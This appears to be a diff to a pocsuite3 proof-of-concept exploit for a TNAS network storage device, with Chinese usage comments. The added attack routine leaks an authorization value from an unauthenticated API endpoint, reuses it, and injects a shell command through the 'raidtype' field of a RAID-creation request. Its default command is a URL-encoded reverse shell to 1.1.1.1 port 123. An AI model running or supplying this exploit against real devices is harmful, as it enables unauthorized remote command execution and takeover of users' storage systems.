@@ -1,7 +1,7 @@
 from collections import OrderedDict
 from email import header
 from urllib.parse import urljoin
-import re
+import re,json
 from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
 from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
 
@@ -29,11 +29,13 @@ class POC(POCBase):
     install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
     pocDesc = '''
     检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
+    利用:pocsuite -r poc++.py -u url(-f url.txt) --attack --cmd 命令（注意url编码）
     '''
     category = POC_CATEGORY.EXPLOITS.REMOTE
 
     def _options(self):
         o = OrderedDict()
+        o["cmd"] = OptString(default='%3Bsh+-i+%3E%26+%2Fdev%2Ftcp%2F1.1.1.1%2F123+0%3E%261%3B', description='', require=True)
         return o
 
     def _verify(self):
@@ -52,7 +54,35 @@ class POC(POCBase):
         return self.parse_output(result)
 
     def _attack(self):
-        return self._verify()
+        result = {}
+        headers = {'User-Agent':'TNAS'}
+        resq = requests.get(url=self.url+'/module/api.php?mobile/webNasIPS',headers=headers,timeout=5)
+        data = json.loads(resq.text)['data']
+        pattern = re.compile(u"(?<=PWD:)(.*)(?=\\nSAT)")
+        str = data
+        PWD=pattern.search(str).group()
+        #print(PWD)
+        headers={
+            'User-Agent': 'TNAS',
+            'AUTHORIZATION':PWD,
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        path = "/module/api.php?mobile/createRaid"
+        url = self.url + path
+        cmd = self.get_option("cmd")
+        payload = f"raidtype={cmd}&diskstring=1646732740"
+        #print(payload)
+        try:
+            resq = requests.post(url=url,headers=headers,data=payload,verify=False)
+            t = resq.text 
+            t = t.replace('\n', '').replace('\r', '')
+            print(t)
+            t = t.replace(" ","")
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = url
+            result['VerifyInfo']['Name'] = t
+        except Exception as e:
+            return
     def parse_attack(self, result):
         output = Output(self)
         if result:
